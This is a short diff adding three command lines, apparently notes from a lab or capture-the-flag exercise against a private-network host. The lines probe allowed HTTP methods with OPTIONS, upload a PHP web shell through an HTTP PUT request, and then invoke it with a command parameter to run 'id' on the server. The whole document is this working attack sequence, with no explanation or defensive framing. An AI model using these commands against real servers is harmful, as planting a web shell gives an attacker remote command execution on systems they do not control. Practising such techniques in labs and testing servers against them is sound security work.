@@ -1,0 +1,5 @@
+curl -v -X OPTIONS http://10.0.2.13/test
+
+curl -v -X PUT -d ‘<?php system ($_GET[“cmd”]); ?>’ http://10.0.2.13/test/shell.php
+
+10.0.2.13/test/shell.php?cmd=id
